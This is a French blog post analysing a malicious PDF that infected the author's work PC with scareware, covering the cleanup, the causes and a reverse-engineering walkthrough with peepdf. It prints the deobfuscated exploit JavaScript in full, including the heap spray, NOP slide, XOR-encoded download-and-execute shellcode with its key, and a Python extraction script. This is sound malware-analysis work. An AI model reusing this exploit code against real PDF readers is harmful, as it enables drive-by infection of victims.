---
title: "Owned : Analyse d'un fichier PDF piégé"
tags: [reverse engineering, malware]
---

## L'intrusion et son nettoyage

Récemment j'ai été victime d'une intrusion. Ça s'est passé de la façon la plus inattendue pourtant la méthodologie d'attaque est plus que banale.  

Comme tous les matins je relevais depuis *Netvibes* des nouveaux flux en rapport avec Linux. J'ai suivi un lien qui m'a amené vers un site que j'avais déjà visité à plusieurs reprises par le passé mais cette fois quelque chose d'anormal s'est passé : le lecteur PDF s'est ouvert sur un fichier PDF vide et en moins d'une minute je me retrouvais avec un [scareware](http://fr.wikipedia.org/wiki/Scareware) sur la machine. Malgré l'interface du logiciel très agréable dans les tons bleu pastel, inutile de vous dire que ce dernier n'était pas le bienvenue.  

Premier réflexe : lancer le gestionnaire de taches, repérer le processus suspicieux (pas compliqué, il se nommait `kij.exe`) et le terminer. Évidemment ça ne suffit pas, ce genre de logiciel est collant.  

Heureusement je disposais de quelques outils sur la machine : un *HijackThis* et un [ProcessExplorer](http://technet.microsoft.com/en-us/sysinternals/bb896653).  

![ProcessExplorer](/assets/img/process_explorer.jpg)

Depuis `ProcessExplorer` je parviens à en savoir plus sur mon ennemi : il s'est placé dans mon dossier `Local Settings\Application data` et d'après netstat a établi des connexions avec un serveur distant.  

Je le termine à nouveau et il réapparait un peu plus tard. Mon premier réflexe est de me dire qu'il a du réussir à s'injecter dans un processus comme explorer. Je tue *kij.exe* ainsi que *explorer.exe*.  

Suspense... ça ne reprend pas.  

Je relance `explorer.exe` : il réapparait ! De plus je remarque un lien entre les deux processus. De mémoire `explorer.exe` était fils de `kij.exe`.  

J'ai d'abord pensé à [la clé de registre Shell](http://fr.wikipedia.org/wiki/Winlogon#Le_shell_de_Windows) qui permet d'utiliser une interface graphique alternative à celle de Windows (pour utiliser par exemple un [BB4Win](http://www.bb4win.org/) ou un *LiteStep*) mais cette clé n'était pas en cause.  

![Clé dans le registre Windows](/assets/img/reg_shell_exe_open.jpg)  

Finalement, en effectuant une recherche dans la base de registre, j'ai trouvé le point de lancement dans l'arborescence `Software\Classes` qui associe le lancement d'un exécutable à une extension donnée.  

Notre malware se lançait à chaque lancement d'un .exe, ce qui explique sa réapparition après avoir tué puis relancé explorer.  

Fort de cette information, j'ai pu me débarrasser de l'intrus. Malheureusement je n'ai pas pu récupérer l'exécutable qui a dû se supprimer lui-même. J'ai tout de même conservé le PDF malicieux pour analyse.  

## Les causes de l'incident (et comment on aurait pu l'éviter)

Autant vous le dire tout de suite : je n'étais pas sur mon PC personnel mais sur le PC du travail. L'intrusion n'aurait jamais aboutie sur mon système Linux pour tout un tas de raisons.  

Il y a plusieurs causes et responsables à cette intrusion.  

Tout d'abord le propriétaire du site dédié à Linux qui servait bien malgré lui le PDF piégé. J'ai eu beau fouiller mon cache Opera pour retrouver le site en question, je n'ai pas retrouvé son adresse. Il est évident que si le site était sécurisé contre des attaques connues comme les XSS et les injections SQL, jamais il n'aurait servi de support à cette attaque.  

Ensuite il y a le lecteur PDF (un vieux [Foxit Reader](http://www.foxitsoftware.com/pdf/reader/)) qui n'est pas à jour sur la machine. J'en étais conscient et j'avais d'ailleurs installé un [Sumatra PDF](http://blog.kowalczyk.info/software/sumatrapdf/free-pdf-reader.html) mais, n'étant pas administrateur du poste, l'association de l'extension .pdf avec Sumatra n'était pas conservée, j'étais obligé d'appeler directement *SumatraPDF* à chaque fois que je voulais lire un PDF.  

Ensuite il y a le problème de l'antivirus : pas d'antivirus ! Je pensais qu'un *Kaspersky* était présent sur la machine mais en regardant la liste des processus, force est de constater que non.  

Pour ces deux défaillances, c'est bien le laxisme (ou la méconnaissance) en matière de sécurité des administrateurs système qui est l'origine du problème.  

Ce serait arrivé sur ma machine Windows personnelle, ça ne serait pas arrivé pour différentes raisons.  

D'abord mon intérêt pour la sécurité informatique. Je me tiens au courant des dernières vulnérabilités et exploits qui existent, surtout pour des logiciels communs comme un lecteur de fichiers PDF.  

Ça me pousse à installer systématiquement les dernières versions logicielles. Avec le récent Reader X d'Acrobat qui ajoute une fonction de sandbox il est à fort parier que l'exploit n'aurait pas fonctionné.  

Ensuite l'antivirus *Avast* est installé et à jour. Il met lui aussi par défaut certaines applications dans une sandbox et aurait pu détecter le caractère malicieux du PDF avec sa base de signatures.  

Imaginons que le PDF exploite une vulnérabilité [0day](http://fr.wikipedia.org/wiki/Zero_day) et soit inconnu des antivirus... il faut encore que l'exécutable droppé passe à travers la vigilance de l'HIPS [ThreatFire](http://www.threatfire.com/)...  

Ces solutions pourtant simples à mettre en place (avec des logiciels gratuits qui plus est !) auraient permis d'éviter cet incident.

## Analyse du fichier PDF

Le fichier PDF récupéré se nommait *manual.pdf* et se résumait à première vue à une page blanche. Quand on le passe à *AVG* sous Linux, il est détecté comme *Exploit.PDF-JS*. *ClamAV* lui ne détecte aucun danger (je commence à avoir l'habitude).  

J'ai décidé de pousser l'analyse en me servant d'un tout nouvel outil Python qui se nommé [peepdf](http://eternal-todo.com/tools/peepdf) qui s'utilise interactivement et est très simple d'utilisation.  

Au lancement, on a le résumé suivant :

```
File: malware_manual.pdf
MD5: 5ec11e1a1e7076457baf0baa35b9f816
Size: 29948 bytes
Version: 1.6
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 19
Streams: 9
Comments: 0
Errors: 1

Version 0:
        Catalog: 23
        Info: 22
        Objects (19): [1, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23]
        Streams (9): [8, 9, 10, 11, 12, 14, 15, 16, 17]
                Encoded (0): []
        Objects with JS code (1): [11]
        Suspicious elements:
                /AcroForm: [23]
                /EmbeddedFile: [8, 9, 10, 11, 12, 14, 15, 16, 17]
```

La commande metadata renvoie des informations qui semblent aléatoires :

```
Info Object in version 0:

<< /CreationDate D:20100829161936
/Author SegosqYvyxoigm PazubIhizo
/Subject KcuhukecyiWodna NixxohyjanucohiDuqe
/Creator NeducuVpel JlAfonypad
/Title GipYok CuvaaBikoimulyw >>
```

Les objets qui nous intéressent dans ce PDF sont les *Streams* indexés 8, 9, 10, 11, 12, 14, 15, 16 et 17.  

Pour les afficher il suffit d'utiliser la commande `stream` suivit de l'index de l'objet souhaité.  

Seuls quelques streams s'avèrent intéressants (dans l'ordre) pour notre analyse.  

Le stream 14 qui définie une variable baptisée `RivoLwotab` dans un format XML :

```xml
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/"><xfa:data><XuwaHsaqyp><RivoLwotab>eval2011tring.fromCharCode</RivoLwotab></XuwaHsaqyp></xfa:data></xfa:datasets>
```

Le stream 10 qui définie quelques variables Javascript :

```html
<subform layout="tb" locale="en_US" name="XuwaHsaqyp">
  <pageSet>
    <pageArea id="BuvAcid" name="BuvAcid">
      <contentArea h="756pt" w="576pt" x="0.25in" y="0.25in"/>
      <medium long="792pt" short="612pt" stock="default"/>
    </pageArea>
  </pageSet>
  <subform h="756pt" w="576pt" name="NacazaLvonocowjap">
  <field h="65mm" name="RivoLwotab" w="85mm" x="53.6501mm" y="88.6499mm">
    <event activity="initialize" name="DygoRacepasicalukuh">
      <script contentType="application/x-javascript">
        Tokabjepivilipytuc='rawV';DyqUrarybynogun='S';
        RukIzy=2011;PofucevyWimbes='replace';KfIpyrsite='substr';
```

et enfin, le plus important, le stream 11 (raccourci pour des raisons de lisibilité) qui est du code Javascript brut :

```javascript
JuholAlypivykunytytd = RivoLwotab[Tokabjepivilipytuc+'alue'][PofucevyWimbes](RukIzy,DyqUrarybynogun);
VekeoFewy=JuholAlypivykunytytd[KfIpyrsite](0,4);
eval('GovbEvynoj=this.'+VekeoFewy);
DadEjybuf=GovbEvynoj(JuholAlypivykunytytd.substr(4,19));
SitoGexo=DadEjybuf(4*29.5,4*24.25,4*28.5,4*8,4*23.75,4*17.75,4*17,...,4*22.25,4*20.75,4*10,4*10.25,4*14.75);
GovbEvynoj(SitoGexo);
```

Il suffit de prendre les données des streams 14 et 10 et de faire les remplacements nécessaires dans le stream 11.  

On obtient finalement (en plusieurs étapes) :

```javascript
JuholAlypivykunytytd = RivoLwotab['rawV'+'alue']['replace'](2011,'S');
JuholAlypivykunytytd = "eval2011tring.fromCharCode"['replace'](2011,'S');
JuholAlypivykunytytd = "evalString.fromCharCode";

VekeoFewy = JuholAlypivykunytytd['substr'](0,4);
VekeoFewy = "evalString.fromCharCode"['substr'](0,4);
VekeoFewy = "eval";

eval('GovbEvynoj=this.'+VekeoFewy);
GovbEvynoj = this.eval

DadEjybuf=GovbEvynoj(JuholAlypivykunytytd.substr(4,19));
DadEjybuf = this.eval("evalString.fromCharCode".substr(4,19));
DadEjybuf = String.fromCharCode;
```

Les deux dernières lignes du stream 11 correspondant par conséquent à un décodage d'un buffer par `String.fromCharCode()` puis son exécution par `this.eval()`.  

Afin d'analyser le buffer encodé sous la forme d'une liste de multiplications entre un entier et un nombre à virgule, je l'ai isolé dans un fichier texte et j'ai créé le script Python suivant pour le décoder :

```python
import sys
fd = open("arg.txt")
buff = fd.read()
fd.close()

for ope in buff.split(","):
  x, y = ope.split("*")
  sys.stdout.write( chr( int( int(x) * float(y) ) ) )
```

Ce qui nous donne le résultat suivant :

```javascript
var _GD = "7414543e6471e52c5e1356366b50e27390deb27d0416e62e5f16b779717779701e343431616665666233363964336239210cb27d5016046b313d37337177797079757570f1f6f5f689258f71653362b20711bbc0b4088d10379503a09ad4c2f2d0d1cbce9e1cfaf4f1a0fb2b1bfcf0aaa02f4629e8b57a98f69b7ff7f2f6f8f1f8f4f4f1a7a6a59df5a1a5aaa2f6a2c2cfc8a1a4cfd0859bcffecc2eedab474ae3a7a7a2a21d8af5f1a05a7a7464f9c2ef49eea1f74d9bf7a2aa5b702665deb5c1f3fe51589d840b42b64db7f7a0f1fa48f7a1a4a75a27a4c854cc29cca4164aa3a7a7a2a21dcaf5f1a05a7a979131ce2bf6912ff5a97ca5b621d6881abdaba2ab9658933259ca948da2898a366ffcab6744512558fe4bbdc821e6b028b7de7b22e383be9336967e9d848121b29c7afea5dea04e2cefef7cf88aa54b4091e2299f2ca64cc30ac7350d0c216a83a73065ada7664f539e8bd38adf452bf981aa49cd2cabe979afeaf41a2ba121f64878ee84bac066afa51f185c555bc8d7d1db988488c6cc938c97919ed2c48494dadfc9c389ced1d38b879fd295c59df2f4c0e7eeccc4e8b0b4cbc8d7d0989ff7";
var _ZZ = "7414543ec405e52c5e135636f212e273a32ab27d04a6e02e4c47b779717779701e34343161666566623336396433623942bdb27d5016046b313d37337177797079757570f1f6f5f689258f71653362b20711bbc0b4088d10379503ab9ad4c2f2d0d1cbce9e17f1fffaabf02010f7fba1ab244d22e3be7193fd9074fcf9fdf3faf3fffffaacadae96feaaaea1a9fda9c9c4c3aaafc4db8e90c4f5c725e6a04c41e8acaca9a91681fefaab51717f6ff2c9e442e5aafc4690fca9a1507b2d6ed5becaf8f55a53968f0049bd46bcfcabfaf143fcaaafac512cafc35fc722c7af1d41a8acaca9a916c1fefaab51719c9a3ac520fd9a24fea277aebd2add8311b6a0a9a09d53983952c19f86a982813d64f7a06c4f5a2e53f540b6c32aedbb23bcd57029e888b5983d9d75968f8a2ab99771f5aed5ab4527e4e477f381ae404b9ae9229427ad47c801cc3e06072a6188ac3b6ea6ac6d44589580d881d44e20f28aa142c627a0e272a4e1ff1120aa2afd4373e58fb1cb6da4ae1413575e50c3dcdad0938f83cdc798879c9a95d9cf8f9fd1d4c2c882c5dad8808c94d99ece96f9ffcbece5c7cfe3bbbfc0c3dcdb9394fc";
var _IB = "8441afefb369d3b9352746dd19730681";

_II = app;
_R = new Array();
function _QJ() {
    var _H = _II.viewerVersion.toString();
    _H = _H.replace('.', '');
    while (_H.length < 4) {
        _H += '0';
    }
    return parseInt(_H, 10);
}
function _F(_I, _M) {
    while (_I.length * 2 < _M) {
        _I += _I;
    }
    return _I.substring(0, _M / 2);
}
function _FA(_MM) {
    _MM = unescape(_MM);
    roteDak = _MM.length * 2;
    dakRote = unescape('%u9090');
    spray = _F(dakRote, 0x2000 - roteDak);
    loxWhee = _MM + spray;
    loxWhee = _F(loxWhee, 524098);
    for (i = 0; i < 400; i++) {
        _R[i] = loxWhee.substr(0, loxWhee.length - 1) + dakRote;
    }
}
function _SR(_MM, len) {
    while (_MM.length < len) {
        _MM += _MM;
    }
    return _MM.substring(0, len);
}
function _U(_MM) {
    ret = '';
    for (i = 0; i < _MM.length; i += 2) {
        b = _MM.substr(i, 2);
        c = parseInt(b, 16);
        ret += String.fromCharCode(c);
    }
    return ret;
}
function decode(_MM, _N) {
    _UE = '';
    for (_C = 0; _C < _MM.length; _C++) {
        _M = _N.length;
        _HE = _MM.charCodeAt(_C);
        _RQ = _N.charCodeAt(_C % _M);
        _UE += String.fromCharCode(_HE ^ _RQ);
    }
    return _UE;
}
function _VX(_C) {
    _FD = _C.toString(16);
    _NJ = _FD.length;
    _UE = (_NJ % 2) ? '0' + _FD : _FD;
    return _UE;
}
function _LX(_MM) {
    _UE = '';
    for (_C = 0; _C < _MM.length; _C += 2) {
        _UE += '%u';
        _UE += _VX(_MM.charCodeAt(_C + 1));
        _UE += _VX(_MM.charCodeAt(_C));
    }
    return _UE;
}
function _YS() {
    _EO = _QJ();
    if (_EO < 9000) {
        _RS = 'o+uASjgggkpuL4BK/////wAAAABAAAAAAAAAAAAQAAAAAAAAfhaASiAgYA98EIBK';
        _XI = _GD;
        _CP = _U(_XI);
    } else {
        _RS = 'kB+ASjiQhEp9foBK/////wAAAABAAAAAAAAAAAAQAAAAAAAAYxCASiAgYA/fE4BK';
        _XI = _ZZ;
        _CP = _U(_XI);
    }
    _A = 'SUkqADggAABB';
    _MF = _SR('QUFB', 10984);
    _J = 'QQcAAAEDAAEAAAAwIAAAAQEDAAEAAAABAAAAAwEDAAEAAAABAAAABgEDAAEAAAABAAAAEQEEAAEAAAAIAAAAFwEEAAEAAAAwIAAAUAEDAMwAAACSIAAAAAAAAAAMDAj/////';
    _L = _A + _MF + _J + _RS;
    _D = decode(_CP, _IB);
    if (_D.length % 2) {
        _D += unescape('%00');
    }
    _X = _LX(_D);
    _FA(_X);
    RivoLwotab.rawValue = _L;
}
_YS();
```

Ce script défini quelques chaines de caractères (bien entendu offusquée) et différentes fonctions qui sont finalement appelés à travers une fonction centrale (`_YS`).  

La fonction `_QJ()` utilise l'objet `app` de l'application et son attribut `viewerVersion` pour déterminer le numéro de version du lecteur PDF. A ce numéro de version est retiré le caractère point et remplis par des 0 pour obtenir 4 caractères. Ainsi si on dispose de *Adobe Reader 9.1*, la fonction retournera la valeur `9100`.  

Je ne sais pas quel numéro de version renvoie le *Foxit* par Javascript mais celui installé sur le poste était un 3.1.1.0901. Selon la version obtenue, le javascript fait le choix entre deux couples de chaines de caractères qui seront utilisées plus tard.  

Un premier décodage est effectué par la fonction `_U()` sur les chaines `_GD` ou `_ZZ`. La fonction `_U()` n'est rien de plus que l'équivalent de la méthode `str.decode("hex_codec")` en Python, c'est-à-dire partir d'une représentation hexadécimale pour obtenir une version brute d'une chaine.  

On a ensuite l'instruction `_SR('QUFB', 10984)`. La fonction `_SR()` permet de répéter la chaine de caractères en premier argument autant de fois que nécessaire pour obtenir une chaine de la longueur spécifiée dans le second argument.  

*"QUFB"* correspond en réalité à la chaine *"AAA"* encodée en base64.  

L'objectif de cette multiplication et vraisemblablement d'utiliser un [heap-spraying](http://en.wikipedia.org/wiki/Heap_spraying) pour augmenter les chances d'exploitation.  

La fonction `decode()` est la plus intéressante. Comme son nom l'indique, elle prend en entrée des chaines de caractères incompréhensibles pour les transformer en une [charge utile](http://fr.wikipedia.org/wiki/Charge_utile#Informatique).  

C'est en réalité le cœur du shellcode qu'il convient d'analyser.  

En Python il est assez facile de la réécrire pour extraire le shellcode :

```python

GD = "7414543e6471e52c5e....b4cbc8d7d0989ff7"
ZZ = "7414543ec405e52c5e....bfc0c3dcdb9394fc"
IB = "8441afefb369d3b9352746dd19730681"
def decode(MM, N):
    UE = ""
    for i in range(len(MM)):
        HE = ord( MM[i] )
        RQ = ord( N[i % len(N)] )
        UE += chr( HE ^ RQ)
    return UE

shellcode = decode(GD.decode("hex_codec"), IB)
```

La fonction `_LX()` transforme cette charge brute en une version comprise par le langage Javascript : une représentation d'une chaine unicode où chaque octet est transformé sous la forme `%uXXXX`.  

La fonction `_FA()` complète le cœur du shellcode pour ajouter un [NOP slide](http://en.wikipedia.org/wiki/NOP_slide).  

La dernière instruction de la fonction `_YS()` intègre ces données malicieuses dans la balise `RivoLwotab` vue dans le stream 14, ce qui déclenche la vulnérabilité et son exploitation.  

## Analyse du shellcode

Comme on peut s'y attendre, le shellcode est crypté : aucune chaine de caractère n'est présente à l'intérieur.  

Une analyse par [HT Editor](http://hte.sourceforge.net/) en mode assembleur révèle par contre quelques instructions intéressantes :  

![Instruction de décryptage du shellcode](/assets/img/sc_encoded.png)

La boucle `lodsb/xor/stosb` à l'offset 59 met en évidence l'utilisation d'un cryptage XOR avec la valeur `0x93`.  

Le shellcode décodé est plus parlant. On trouve à la fin une URL permettant vraisemblablement de récupérer un exécutable.  

![Decoded shellcode hexa dump](/assets/img/sc_decoded.png)

On y voit aussi la mise en place de la chaine `urlmon` sur la pile (offsets 8f et 94) et la valeur hexadécimale `ec0e4e8e` qui sert de hash pour retrouver la fonction `LoadLibrary()`. Voir [ce document PDF](http://resources.infosecinstitute.com/articles/imagefiles/26/PDFUpload.pdf) pour ce type de technique.  

![Shellcode ASM download et execute](/assets/img/sc_downexec.png)

Les fonctions ensuite appelées, retrouvées par leur hash, sont `URLDownloadToCacheFile`, `CreateProcessA` et `TerminateThread`.  

Par une recherche sur Google, j'ai trouvé [un article de Symantec traitant d'une exploitation quasi-similaire](http://www.symantec.com/connect/blogs/pdf-exploit-same-crime-different-face).  

La vulnérabilité exploitée se situerait alors dans la *LibTIFF* utilisée par différents lecteurs PDFs, même si je ne saurais le prouver.  

Concernant l'exécutable qui doit être téléchargé par le shellcode, il n'était malheureusement plus disponible au moment de mon analyse.

*Published May 19 2011 at 08:54*
